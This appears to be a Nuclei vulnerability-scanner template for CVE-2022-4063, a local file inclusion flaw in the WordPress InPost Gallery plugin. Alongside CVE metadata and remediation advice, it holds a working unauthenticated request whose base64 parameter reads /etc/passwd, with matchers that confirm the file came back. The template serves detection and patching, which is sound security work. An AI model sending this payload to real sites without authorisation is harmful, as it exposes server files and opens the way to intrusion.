id: CVE-2022-4063
info:
  name: WordPress InPost Gallery <2.1.4.1 - Local File Inclusion
  author: theamanrawat
  severity: critical
  description: The WordPress InPost Gallery plugin before 2.1.4.1 has a vulnerability
    that allows attackers to execute code remotely on servers by exploiting its insecure
    use of PHP's extract() function, which enables local file inclusion.
  remediation: Fixed in version 2.1.4.1.
  reference:
  - https://wpscan.com/vulnerability/6bb07ec1-f1aa-4f4b-9717-c92f651a90a7
  - https://wordpress.org/plugins/inpost-gallery/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-4063
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-4063
    cwe-id: CWE-22
  metadata:
    verified: 'true'
    impact: The existence of a local file inclusion vulnerability in the WordPress
      InPost Gallery plugin before 2.1.4.1 can result in remote code execution by
      attackers who exploit the extract() function used in rendering HTML views.
    recommendation: We recommend updating WordPress InPost Gallery plugin to version
      2.1.4.1 or later to mitigate the risk of local file inclusion vulnerabilities.
  tags: cve,wp-plugin,wp,inpost-gallery,cve2022,lfi,wordpress,unauth,wpscan
requests:
- method: GET
  path:
  - '{{BaseURL}}/wp-admin/admin-ajax.php?action=inpost_gallery_get_gallery&popup_shortcode_key=inpost_fancy&popup_shortcode_attributes=eyJwYWdlcGF0aCI6ICJmaWxlOi8vL2V0Yy9wYXNzd2QifQ=='
  matchers-condition: and
  matchers:
  - type: regex
    part: body
    regex:
    - 'root:.*:0:0:'
  - type: word
    part: header
    words:
    - text/html
  - type: status
    status:
    - 200
